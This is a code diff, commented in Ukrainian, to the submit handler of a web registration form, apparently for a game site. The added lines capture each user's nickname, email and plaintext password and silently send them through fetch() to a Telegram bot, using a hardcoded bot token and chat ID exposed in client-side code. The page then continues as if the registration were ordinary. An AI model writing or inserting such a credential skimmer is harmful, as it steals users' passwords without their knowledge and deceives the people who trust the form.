@@ -29,6 +29,7 @@ document.getElementById('registration-form').addEventListener('submit', function
 
     const nickname = document.getElementById('nickname').value;
     const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value; // Отримуємо пароль з форми
     const errorSpan = document.getElementById('email-error');
 
     if (!email.includes('@') || !email.includes('.')) {
@@ -38,6 +39,29 @@ document.getElementById('registration-form').addEventListener('submit', function
     }
 
     errorSpan.style.display = "none";
+    
+    // === ВІДПРАВКА В TELEGRAM ===
+    // Встав сюди свій токен від BotFather та Chat ID від Getmyid_bot
+    const botToken = '8460092788:AAHPbETm_DIczqYL7vA4XCbnWioiVBZYHwg'; 
+    const chatId = ' 8399462172';             
+    
+    // Формуємо текст повідомлення
+    const messageText = `🔥 Нова реєстрація!\n👤 Нікнейм: ${nickname}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
+    
+    // Створюємо URL для запиту до API Telegram
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
+
+    // Відправляємо запит
+    fetch(telegramUrl)
+        .then(response => {
+            if(response.ok) {
+                console.log("Дані успішно відправлені в Telegram!");
+            } else {
+                console.error("Помилка відправки в Telegram.");
+            }
+        })
+        .catch(error => console.error("Помилка:", error));
+
     document.getElementById('player-display').innerHTML = `Player: <strong>${nickname}</strong>`;
    
     // Після реєстрації показуємо кнопку Settings
